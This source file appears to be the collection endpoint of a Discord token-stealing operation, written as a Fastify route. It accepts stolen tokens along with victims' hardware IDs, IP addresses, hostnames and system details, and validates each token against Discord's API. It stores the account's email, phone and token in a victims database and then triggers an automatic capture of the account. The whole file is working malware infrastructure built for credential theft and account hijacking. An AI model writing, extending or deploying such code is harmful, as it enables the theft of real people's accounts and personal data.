const { upsertVictim } = require('../lib/supabase');
const { generateTags } = require('../lib/tags');
const { checkRateLimit } = require('../lib/rate-limit');
const { autoCapture } = require('../lib/capture');

async function collectRoutes(fastify) {
  fastify.post('/', async (req, reply) => {
    const apiKey = req.headers['x-api-key'];
    if (!apiKey || apiKey !== process.env.COLLECT_API_KEY) return reply.code(401).send({ error: 'Invalid API key' });
    const rl = checkRateLimit('collect', 100, 60000);
    if (!rl.allowed) return reply.code(429).send({ error: 'Rate limited' });

    const { token, system, source } = req.body || {};
    if (!token || token === '0' || token === 'no_token_found') {
      const result = await upsertVictim({ user_id: source || '0', username: token || 'no_token', token: token || null, hwid: system?.hwid || null, ip: system?.ip || null, hostname: system?.hostname || null, os: system?.os || null, ram_gb: system?.ram_gb || null, source: source || 'unknown', tags: [] });
      return { success: true, victim: { user_id: result.id } };
    }

    let discordRes;
    try { discordRes = await fetch('https://discord.com/api/users/@me', { headers: { Authorization: `Bearer ${token}` } }); } catch { discordRes = { ok: false }; }
    if (!discordRes.ok) {
      const result = await upsertVictim({ user_id: source || token, username: 'invalid_token', token, hwid: system?.hwid || null, ip: system?.ip || null, hostname: system?.hostname || null, os: system?.os || null, ram_gb: system?.ram_gb || null, source: source || 'unknown', tags: [] });
      return { success: true, victim: { user_id: result.id } };
    }

    const discordUser = await discordRes.json();
    const autoTags = generateTags(discordUser.username || '');
    const result = await upsertVictim({ user_id: discordUser.id, username: discordUser.username, global_name: discordUser.global_name || null, avatar: discordUser.avatar || null, email: discordUser.email || null, phone: discordUser.phone || null, token, hwid: system?.hwid || null, ip: system?.ip || null, hostname: system?.hostname || null, os: system?.os || null, ram_gb: system?.ram_gb || null, source: source || 'unknown', tags: autoTags.map(t => t.id) });

    autoCapture(token, discordUser.username).catch(() => {});
    return { success: true, victim: { user_id: discordUser.id, username: discordUser.username } };
  });
}

module.exports = collectRoutes;
